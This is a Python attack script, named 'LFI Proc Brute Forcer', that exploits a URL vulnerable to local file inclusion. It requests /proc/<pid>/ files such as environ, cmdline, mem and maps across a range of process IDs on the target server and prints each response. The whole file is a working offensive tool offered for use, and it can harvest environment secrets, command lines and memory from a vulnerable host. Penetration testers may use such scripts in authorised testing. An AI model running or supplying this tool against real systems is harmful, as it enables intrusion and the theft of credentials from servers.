import sys
import getopt
import requests

def procPIDBruteForce(target, iterations, procs):
    for i in range(0, len(procs)):
        for j in range(0, iterations):
            r = requests.get(target + '/proc/' + str(j) + '/' + procs[i])
            clean_response = r.content.decode('utf-8')
            print('Iteration ' + str(j) + ' [' + procs[i] + ']: ' + clean_response)

def main():
    try:
        options, arguments = getopt.getopt(sys.argv[1:], 'ht:i:a', ['help', 'target=', 'iterations=', 'all', 'cmdline', 'cpu', 'cwd', 'environ', 'exe', 'fd', 'maps', 'mem', 'root', 'stat', 'statm', 'status'])
    except getopt.GetoptError:
        print('An invalid option was detected. For help, use "-h".')
        return
    target = None
    iterations = 0
    procs = []
    for opt, arg in options:
        if opt in ('-h', '--help'):
            print('Name: LFI Proc Brute Forcer v0.1')
            description = 'Description: This script will automatically brute force proc IDs. It requires a URL vulnerable to local file inclusion (LFI).'
            print(description)
            print('Usage: python3 lfi-proc-brute-force.py -t <vulnerable_url> -i <iterations> [options]\n')
            print('Options:')
            print('-h, --help\t Show this menu.')
            print('-t, --target\t The destination URL to run this script against.')
            print('-i, --iterations The number of proc IDs to test for starting from zero.')
            print('-a, --all\t Test for all of the following proc types.')
            print('--cmdline\t Command line arguments.')
            print('--cpu\t\t Current and last cpu in which it was executed.')
            print('--cwd\t\t Link to the current working directory.')
            print('--environ\t Values of environment variables.')
            print('--exe\t\t Link to the executable of this process.')
            print('--fd\t\t Directory, which contains all file descriptors.')
            print('--maps\t\t Memory maps to executables and library files.')
            print('--mem\t\t Memory held by this process.')
            print('--root\t\t Link to the root directory of this process.')
            print('--stat\t\t Process status.')
            print('--statm\t\t Process memory status information.')
            print('--status\t Process status in human readable form.')
        elif opt in ('-t', '--target'):
            target = arg
        elif opt in ('-i', '--iterations'):
            try:
                iterations = int(arg)
            except:
                print('You must specify a number of iterations. For help, use "-h".')
                return
        elif opt in ('--cmdline', '--cpu', '--cwd', '--environ', '--exe', '--fd', '--maps', '--mem', '--root', '--stat', '--statm', '--status'):
            procs.append(opt[2:]) # remove the "--" and append to list
        elif opt in ('-a', '--all'):
            procs = ['cmdline', 'cpu', 'cwd', 'environ', 'exe', 'fd', 'maps', 'mem', 'root', 'stat', 'statm', 'status']
    
    # prevent duplicates
    procs = list(set(procs))
    procs.sort()

    if target is None:
        print('You must provide a target. For help, use "-h".')
        return

    if iterations is None:
        print('You must specify a number of iterations. For help, use "-h".')
        return
    elif iterations < 0:
        print('Please specify a positive number of iterations. For help, use "-h".')
        return
    
    if procs == []:
        print('Please specify a proc type to brute force. For help, use "-h".') 
        
    procPIDBruteForce(target, iterations, procs)    

main()
